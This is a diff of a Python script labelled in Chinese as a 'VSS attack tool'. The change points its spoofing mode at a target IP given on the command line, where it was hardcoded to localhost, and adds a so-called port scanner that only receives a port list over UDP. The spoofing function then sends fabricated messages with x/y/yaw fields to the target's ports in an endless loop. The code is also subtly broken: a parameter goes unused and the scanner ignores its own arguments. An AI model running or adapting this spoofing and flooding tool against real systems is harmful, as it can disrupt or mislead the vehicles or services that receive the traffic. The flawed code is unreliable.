@@ -122,9 +122,9 @@ def send_packet(udp_socket, attack_message, attack_address):
     except Exception as e:
         print(f'Error sending packet to {attack_address}: {e}')
 
-def spoofing():
-    target_ip = '127.0.0.1'
-    ip_tables = []
+def spoofing(target, ports):
+    target_ip = target
+    ip_tables = open_ports
 
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     add_noise_x, add_noise_y, add_noise_yaw = 0, 0, 0  # 假设这些值不变
@@ -141,31 +141,25 @@ def spoofing():
                 attack_address = (target_ip, port)
                 send_packet(udp_socket, attack_message, attack_address)
 
-def demo():
-    target_ip = '127.0.0.1'
-    ip_tables = []
-
-    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-    with open('ip_table', 'r') as f:
-        for line in f:
-            port = line.strip()
-            ip_tables.append(int(port))
-
-    
-        attack_message = build_fake_message()
-        while(True):
-            for port in ip_tables:
-                attack_address = (target_ip, port)
-                send_packet(udp_socket, attack_message, attack_address)
-
+def udp_port_scanner(target_ip='', start_port=1024, end_port=65532):
+    open_ports = []
+    recv_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    recv_socket.bind(('', 10086))
+    port_tables, _ = recv_socket.recvfrom(4096)
+    port_tables_str = port_tables.decode('utf-8')
+    ports = port_tables_str.strip().split(',')
+    for port in ports:
+        open_ports.append(int(port))
+    print(open_ports)
+    return open_ports
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="VSS攻击工具")
     parser.add_argument('--name', type=str, help='攻击方式如:ddos, replay, spoofing', required=True)
-
+    parser.add_argument('--target', type=str, help='攻击目标ip', required=True)
     # 解析命令行参数
     args = parser.parse_args()
+    open_ports = udp_port_scanner(args.target)
     if args.name == 'spoofing':
-        spoofing()
+        spoofing(target=args.target, ports=open_ports)
     elif args.name == 'replay':
         print('replay is not implemented')
